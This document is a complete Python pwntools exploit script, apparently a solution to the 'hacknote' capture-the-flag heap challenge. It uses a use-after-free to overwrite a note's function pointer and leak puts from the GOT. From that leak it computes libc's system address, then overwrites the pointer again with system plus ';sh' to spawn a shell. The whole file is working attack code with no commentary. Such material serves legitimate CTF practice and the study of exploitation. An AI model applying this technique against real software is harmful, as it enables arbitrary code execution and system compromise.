from pwn import *

BUF = 'AAAA'
PRINT_FROM_NEXT_BYTE_FUNC = p32(0x0804862B)
NOTE_AMOUNT = 2
libc = ELF('libc_32.so.6')
hacknote = ELF('hacknote')
PUTS_GOT_PLT_ADDR = p32(0x0804a024)


class Prompts:
    CHOICE = 'Your choice :'
    NOTE_SIZE = 'Note size :'
    CONTENT = 'Content :'
    INDEX = 'Index :'


class BinSizes:
    NOTE = '8'
    CONTENT = '40'


class Choices:
    ADD = '1'
    DELETE = '2'
    PRINT = '3'


p = gdb.debug(
    hacknote.path,
    '''
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def add_notes(size, content, amount):
    for _ in range(amount):
        p.sendafter(Prompts.CHOICE, Choices.ADD)
        p.sendafter(Prompts.NOTE_SIZE, size)
        p.sendafter(Prompts.CONTENT, content)


def del_notes(note_indexes):
    for note_index in note_indexes:
        p.sendafter(Prompts.CHOICE, Choices.DELETE)
        p.sendafter(Prompts.INDEX, str(note_index))


def override_note_func(func_ptr):
    p.sendafter(Prompts.CHOICE, Choices.ADD)
    p.sendafter(Prompts.NOTE_SIZE, BinSizes.NOTE)
    p.sendafter(Prompts.CONTENT, func_ptr)


def call_note_func():
    print("[*] Calling the overridden function.")
    p.sendafter(Prompts.CHOICE, Choices.PRINT)
    p.sendafter(Prompts.INDEX, '0')


def read_libc_base_address():
    print(f"[*] Leaking libc's base address.")
    libc_base = u32(p.readn(4)) - libc.symbols['puts']
    print(f"[*] libc's base address: {hex(libc_base)}")
    return libc_base


def main():
    add_notes(BinSizes.CONTENT, BUF, 2)
    del_notes([0, 1])
    override_note_func(PRINT_FROM_NEXT_BYTE_FUNC + PUTS_GOT_PLT_ADDR)
    call_note_func()
    system_addr = read_libc_base_address() + libc.symbols['system']
    del_notes([2])
    override_note_func(p32(system_addr) + b';sh')
    call_note_func()


if __name__ == "__main__":
    main()
